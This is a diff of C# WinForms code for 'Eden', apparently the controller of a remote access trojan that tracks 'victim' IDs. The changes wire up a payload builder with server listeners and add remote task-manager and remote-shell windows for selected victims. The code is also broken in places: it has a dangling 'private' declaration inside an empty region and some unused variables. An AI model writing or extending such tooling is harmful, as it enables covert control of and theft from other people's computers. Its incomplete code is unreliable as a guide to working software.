@@ -6,11 +6,20 @@ namespace Eden
     public partial class Form1 : Form
     {
         public Client m_clnt;
+        private List<List<string>> m_lsListener;
+
+        private bool fnClientIsNull() => m_clnt == null;
 
         public Form1()
         {
             InitializeComponent();
         }
+
+        #region Tools
+
+        private 
+
+        #endregion
 
         void ServerMessageReceived(Client clnt, string szVictimID, string[] aMsg)
         {
@@ -73,6 +82,17 @@ namespace Eden
                     }));
                 }
             }
+            else if (aMsg[0] == "listener")
+            {
+                if (aMsg[1] == "list")
+                {
+                    if (aMsg[2] == "listener")
+                    {
+                        List<List<string>> lsListener = Tools.EZData.String2TwoDList(aMsg[3]);
+                        m_lsListener = lsListener;
+                    }
+                }
+            }
             else if (aMsg[0] == "disconnect")
             {
                 if (aMsg[1] == "victim")
@@ -93,12 +113,16 @@ namespace Eden
             {
                 MessageBox.Show("You are disconnected to the server.", "Disconnect", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 listView1.Items.Clear();
+
+                toolStripMenuItem7.Enabled = m_clnt != null;
+                toolStripButton1.Enabled = m_clnt != null;
             }));
         }
 
         void setup()
         {
             toolStripMenuItem7.Enabled = m_clnt != null;
+            toolStripButton1.Enabled = m_clnt != null;
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -125,6 +149,7 @@ namespace Eden
             f.Dispose();
 
             toolStripMenuItem7.Enabled = clnt != null;
+            toolStripButton1.Enabled = clnt != null;
 
             if (clnt == null)
                 return;
@@ -133,7 +158,9 @@ namespace Eden
 
             clnt.ServerMessageReceived += ServerMessageReceived;
             clnt.SocketDisconnect += Disconnect;
+
             clnt.SendCommand("user|list");
+            clnt.SendCommand("listener|list|listener");
         }
 
         private void toolStripMenuItem7_Click(object sender, EventArgs e)
@@ -154,6 +181,7 @@ namespace Eden
 
             foreach (ListViewItem item in listView1.SelectedItems)
             {
+                frmInformation frm;
                 if (Tools.FindForm<frmInformation>(item.Text) != null)
                     continue;
 
@@ -172,6 +200,7 @@ namespace Eden
 
             foreach (ListViewItem item in listView1.SelectedItems)
             {
+                frmFileMgr frm;
                 if (Tools.FindForm<frmFileMgr>(item.Text) != null)
                     continue;
 
@@ -185,8 +214,38 @@ namespace Eden
 
         private void toolStripButton1_Click_1(object sender, EventArgs e)
         {
-            frmBuild f = new frmBuild();
+            frmBuild f = new frmBuild(m_clnt, m_lsListener);
             f.Show();
+        }
+
+        private void toolStripMenuItem3_Click(object sender, EventArgs e)
+        {
+            if (fnClientIsNull())
+                return;
+
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                if (Tools.FindForm<frmTaskMgr>(item.Text) != null)
+                    continue;
+
+                frmTaskMgr f = new frmTaskMgr(m_clnt, item.Text);
+                f.Show();
+            }
+        }
+
+        private void toolStripMenuItem2_Click(object sender, EventArgs e)
+        {
+            if (fnClientIsNull())
+                return;
+
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                if (Tools.FindForm<frmShell>(item.Text) != null)
+                    continue;
+
+                frmShell f = new frmShell(m_clnt, item.Text);
+                f.Show();
+            }
         }
     }
 }
